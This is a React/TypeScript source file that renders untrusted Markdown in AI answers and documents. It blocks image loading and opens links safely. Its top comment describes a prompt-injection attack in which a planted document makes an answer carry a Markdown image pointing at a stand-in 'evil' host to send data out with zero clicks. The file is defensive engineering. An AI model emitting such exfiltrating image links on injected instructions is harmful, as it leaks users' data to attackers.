import type { ReactNode } from "react";
import type { Components } from "react-markdown";
import { hostname } from "@/lib/utils";

/**
 * Images in answers and documents are never fetched: a prompt-injected document can
 * make an answer carry `![](https://evil/?d=…)`, and loading it would send the data
 * with zero clicks. The CSP (`img-src 'self'`) enforces the same rule.
 */
export function BlockedImage({ src, alt }: { src?: string | Blob; alt?: string }) {
  const host = typeof src === "string" ? hostname(src) : null;
  const label = ["image", alt?.trim(), host].filter(Boolean).join(" · ");
  return (
    <span
      title="Images aren't loaded from answers or documents"
      className="mx-[1px] inline-flex h-[18px] items-center rounded-[5px] border border-line bg-surface-2 px-1.5 align-middle font-mono text-[10.5px] text-ink-3"
    >
      {label}
    </span>
  );
}

export function ExternalLink({ href, children }: { href?: string; children?: ReactNode }) {
  return (
    <a href={href} target="_blank" rel="noreferrer noopener" title={hostname(href ?? null) ?? undefined}>
      {children}
    </a>
  );
}

/** Components for rendering untrusted Markdown (document bodies). */
export const safeComponents: Components = {
  img: ({ src, alt }) => <BlockedImage src={src} alt={alt} />,
  a: ({ href, children }) => <ExternalLink href={href}>{children}</ExternalLink>,
};
